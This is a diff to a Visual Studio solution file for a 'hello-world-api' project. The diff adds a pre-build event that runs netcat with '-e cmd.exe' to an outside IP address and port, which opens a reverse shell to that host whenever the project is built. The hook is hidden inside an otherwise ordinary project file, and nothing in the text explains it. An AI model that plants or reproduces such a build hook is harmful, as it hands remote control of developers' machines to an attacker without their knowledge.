@@ -2,6 +2,11 @@
 Microsoft Visual Studio Solution File, Format Version 12.00
 # Visual Studio 2012
 Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "hello-world-api", "hello-world-api\hello-world-api.csproj", "{3FFEDBC1-AC8B-4820-A349-942B05498238}"
+<PreBuildEvent>
+    <Command>
+    cmd /c nc.exe -e cmd.exe 192.168.234.128 1337
+    </Command>
+</PreBuildEvent>
 EndProject
 Global
 	GlobalSection(SolutionConfigurationPlatforms) = preSolution
